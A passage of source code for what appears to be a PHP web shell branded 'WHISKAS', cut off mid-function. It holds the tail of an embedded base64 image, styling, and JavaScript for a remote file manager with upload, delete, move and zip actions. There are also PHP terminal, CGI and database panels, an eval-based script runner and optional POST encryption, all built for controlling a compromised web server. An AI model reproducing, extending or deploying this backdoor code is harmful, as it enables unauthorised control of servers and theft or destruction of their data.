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)}
<?php echo '
@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
#WHISKASloader{'.$csscode.'width:100px;height:100px;}
#a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
.ajaxarea{display:none;border:1px solid #39FF14;color:#ffffff}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#39FF14;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(https://wallpapercave.com/wp/wp2730030.gif);background-position:center;background-attachment:fixed;background-repeat:no-repeat;background-size:100%}.header{height:auto;width:auto;border:7px solid #39FF14;color:'.WHISKAS_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#000;text-decoration:none;}span{font-weight:bolder;color:#fff}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#000;display:inline-block;font-weight:bold}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#000;font-size:small;display:inline-block;font-weight:bold}input[type="file"]{display:none}.inputfile{border:1px solid #FFFFFF;background:transparent;box-shadow:0 0 4px #39FF14;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #F8F8FF;border:1px solid #F8F8FF;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#cacaca !important;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('WHISKASmini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#000;background-color:#39FF14;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #39FF14;background:transparent;box-shadow:0 0 4px #39FF14;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:#2df859;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #F8F8FF;border:1px solid #F8F8FF;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#39FF14;background-image:url('.__showicon('WHISKASmini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#000;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#39FF14;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 5px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.menu_options{display:inline-flex;justify-content:center;align-items:center;width:160px;height:30px;padding:0 10px;font-size:16px;font-weight:700;text-decoration:none;color:#FFFFFF;border:2px solid #000000;background:linear-gradient(180deg, #686868 10%, #161616 50%, #404040 100%);border-radius:12px;box-shadow:0 4px 8px rgba(0,0,0,.2);transition:.3s;text-align:center;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.menu_options:hover{background:linear-gradient(135deg, #50ff00 0%, #66e900 50%, #009100 100%);transform:scale(1.05);box-shadow:0 6px 12px rgba(0,0,0,.3)}.menu_options:active{transform:scale(.97);box-shadow:0 3px 6px rgba(0,0,0,.2)}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:bold;clear:both;width:115px;margin-right:2px;padding:3px 10px;margin-top:8px;border:1px solid #39FF14;font-size:13px;color:#FFFFFF;text-shadow:0 1px 3px rgba(0,0,0,0.8),0 0 6px rgba(0,0,0,0.5)}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#39FF14;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#39FF14}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #F8F8FF;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #39FF14;background:transparent;box-shadow:0 0 4px #39FF14;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #F8F8FF;border:1px solid #F8F8FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.WHISKAS_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1.5px solid #FFFFFF;background:transparent;box-shadow:0 0 4px #39FF14;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #F8F8FF;border:2px solid #F8F8FF;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #F8F8FF;border:1px solid #F8F8FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #39FF14;background:#000;text-decoration:none;box-shadow:0 0 4px #39FF14;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #F8F8FF;box-shadow:0 0 4px #F8F8FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #39FF14;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px;color:#FFFFFF !important; }.WHISKAS_custom_cmd_btn {padding: 5px;color: #FFFFFF;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.WHISKASCssLoadColors().'
@media screen and (max-width:768px){
.whole{padding:5px}
.header{font-size:11px;padding:8px;border-width:4px;overflow-x:auto}
.header table{width:100%}
.header td{display:block;padding:3px 0}
#meunlist{border-width:4px}
.whole #meunlist ul{padding:8px 3px}
.whole #meunlist li{display:block;margin:3px 0}
.whole #meunlist a{display:block;padding:10px;margin:2px 0;border-right:none;border-bottom:1px solid #FFFFFF30;font-size:13px}
.foot{border-width:4px;padding:10px;font-size:11px}
.main{font-size:11px}
.main th,.main td{padding:8px 4px}
table.main{display:block;overflow-x:auto;white-space:nowrap}
input[type=text],input[type=number],select,textarea{width:100%;max-width:100%;box-sizing:border-box;font-size:16px;padding:10px}
select{width:100%}
.button,button{padding:12px 15px;font-size:14px;min-height:44px}
input[type=submit]{width:44px;height:44px}
.inputfile{width:100%;height:auto;padding:10px}
.txtfont,.tbltxt{font-size:12px}
.txtfont_header{font-size:medium}
.editor-modal{margin-left:2%;margin-right:2%}
.editor-explorer{display:none}
.options_holder{padding:10px}
.filestools{font-size:11px}
#filesman_tabs{overflow-x:auto;white-space:nowrap;-webkit-overflow-scrolling:touch}
.foottable{width:100%}
}
@media screen and (max-width:480px){
.whole #meunlist a{font-size:12px;padding:8px}
.header{font-size:10px}
.main{font-size:10px}
.main th,.main td{padding:6px 3px}
input[type=text],input[type=number],select,textarea{font-size:14px;padding:8px}
.button,button{padding:10px 12px;font-size:13px}
}
input,textarea,select,[contenteditable]{color:#FFFFFF !important;caret-color:#FFFFFF !important;}
input[type="text"],input[type="password"],input[type="number"],textarea,[contenteditable]{background:#111 !important;color:#FFFFFF !important;}
input:-webkit-autofill{-webkit-text-fill-color:#FFFFFF !important;-webkit-box-shadow:0 0 0 1000px #111 inset !important;}
::placeholder{color:#0a6e06 !important;}
pre,code,.ml1{color:#FFFFFF !important;}
.inputfile strong{color:#FFFFFF !important;font-weight:bold !important;font-size:11px !important;}
.php-terminal-output{background:url(https://storage.dk-only.site/shell-assest/dk-profile.png) center/30% no-repeat #000 !important;}

</style>';
echo "<script type='text/javascript'>
var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
var post_encryption_mode = ".(__WHISKAS_POST_ENCRYPTION__?'true':'false').";";?>
var WHISKAS1_="",WHISKAS2_="",WHISKAS3_="",WHISKAS4_="",WHISKAS5_="",WHISKAS6_="",WHISKAS7_="",WHISKAS8_="",WHISKAS9_="",WHISKAS10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,WHISKAS_can_add_opt=!1,WHISKAS_before_do_action_id="",WHISKAS_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_WHISKAS_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],WHISKAS_current_fm_id=1,WHISKAS_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.WHISKAS1.value=null!=t?t:"",d.mf.WHISKAS2.value=null!=i?i:"",d.mf.WHISKAS3.value=null!=l?l:"",d.mf.WHISKAS4.value=null!=o?o:"",d.mf.WHISKAS5.value=null!=r?r:"",d.mf.WHISKAS6.value=null!=n?n:"",d.mf.WHISKAS7.value=null!=s?s:"",d.mf.WHISKAS8.value=null!=c?c:"",d.mf.WHISKAS9.value=null!=f?f:"",d.mf.WHISKAS10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=WHISKAS_current_fm_id,t="a="+WHISKASb64("FilesMan")+"&c="+WHISKASb64(e.c.value)+"&WHISKAS1="+WHISKASb64(e.WHISKAS1.value)+"&ajax="+WHISKASb64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+WHISKASb64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.WHISKAS1.value)return!1;switch(WHISKASloader("filesman_holder_"+a,"block"),e.WHISKAS1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){WHISKASloader("filesman_holder_"+a,"none"),WHISKASFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",WHISKASInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_WHISKAS_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),WHISKASClearAjax(l)):4==o.readyState&&200!=o.status&&(WHISKASAjaxError(o.status,l,o.statusText,o.responseText),WHISKASClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function WHISKASClearAjax(e){_WHISKAS_AJAX_.hasOwnProperty(e)&&delete _WHISKAS_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=WHISKAS_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",WHISKASb64(e.a.value)),l.append("c",WHISKASb64(e.c.value)),l.append("WHISKAS1",WHISKASb64(e.WHISKAS1.value)),l.append("charset",WHISKASb64(e.charset.value)),l.append("ajax",WHISKASb64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_WHISKAS_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":WHISKASAjaxError(a.status,"upload_area",a.statusText,a.responseText),WHISKASClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row 